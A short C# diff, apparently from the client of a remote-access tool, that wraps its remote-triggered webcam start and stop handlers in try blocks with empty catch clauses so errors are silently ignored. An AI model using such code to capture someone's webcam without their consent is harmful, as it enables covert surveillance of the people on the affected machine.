@@ -45,27 +45,40 @@ namespace xClient.Core.Commands
             NeedsCapture = true;
             Webcam = command.Webcam;
             Resolution = command.Resolution;
-            if (!WebcamStarted)
+            try
             {
-                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                FinalVideo = new VideoCaptureDevice(videoCaptureDevices[command.Webcam].MonikerString);
-                FinalVideo.NewFrame += FinalVideo_NewFrame;
-                FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[command.Resolution];
-                FinalVideo.Start();
-                WebcamStarted = true;
+                if (!WebcamStarted)
+                {
+                    var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                    FinalVideo = new VideoCaptureDevice(videoCaptureDevices[command.Webcam].MonikerString);
+                    FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[command.Resolution];
+                    FinalVideo.NewFrame += FinalVideo_NewFrame;
+                    FinalVideo.Start();
+                    WebcamStarted = true;
+                }
+            }
+            catch
+            {
+                
             }
         }
 
         public static void HandleDoWebcamStop(DoWebcamStop command, Client client)
         {
-            NeedsCapture = false;
-            WebcamStarted = false;
-            Client = null;
-            if (FinalVideo != null)
+            try
             {
-                FinalVideo.NewFrame -= FinalVideo_NewFrame;
-                FinalVideo.Stop();
-                FinalVideo = null;
+                NeedsCapture = false;
+                WebcamStarted = false;
+                Client = null;
+                if (FinalVideo != null)
+                {
+                    FinalVideo.NewFrame -= FinalVideo_NewFrame;
+                    FinalVideo.Stop();
+                    FinalVideo = null;
+                }
+            }
+            catch
+            {
             }
         }
 
